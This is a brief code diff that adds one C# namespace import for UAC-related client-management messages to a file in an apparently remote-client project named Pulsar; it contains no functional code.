@@ -9,6 +9,7 @@ using Pulsar.Client.Utilities;
 using Pulsar.Common.Enums;
 using Pulsar.Common.Messages;
 using Pulsar.Common.Messages.ClientManagement;
+using Pulsar.Common.Messages.ClientManagement.UAC;
 using Pulsar.Common.Messages.Other;
 using Pulsar.Common.Networking;
 using Pulsar.Common.UAC;
